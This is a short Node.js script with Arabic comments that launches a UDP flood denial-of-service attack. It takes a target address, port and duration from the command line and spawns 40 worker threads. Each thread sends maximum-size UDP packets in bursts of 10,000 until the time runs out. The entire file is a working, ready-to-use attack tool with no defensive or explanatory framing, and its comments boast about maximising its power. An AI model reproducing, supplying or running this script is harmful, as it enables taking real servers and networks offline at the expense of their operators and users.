const dgram = require('dgram');
const { Worker, isMainThread, workerData } = require('worker_threads');

const target = process.argv[2];
const port = process.argv[3];
const duration = parseInt(process.argv[4], 10);
const threads = 40; // رفع عدد الـ Threads إلى 40 لزيادة القوة

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('X'.repeat(size)); // تعبئة الحزمة بأكبر قدر من البيانات
    return payload;
}

const payload = generatePayload(65507); // الحد الأقصى لحجم حزم UDP

if (isMainThread) {
    console.log(`🚀 Starting MAX POWER UDP flood on ${target}:${port} for ${duration} seconds with ${threads} threads.`);

    for (let i = 0; i < threads; i++) {
        new Worker(__filename, { workerData: { target, port, duration } });
    }
} else {
    const { target, port, duration } = workerData;
    const socket = dgram.createSocket('udp4');
    let startTime = Date.now();

    function sendPackets() {
        if (Date.now() - startTime < duration * 1000) {
            for (let i = 0; i < 10000; i++) { // إرسال 10,000 حزمة دفعة واحدة
                socket.send(payload, port, target);
            }
            setImmediate(sendPackets);
        } else {
            console.log(`🔥 Thread finished attack on ${target}:${port}`);
            socket.close();
        }
    }

    sendPackets();
}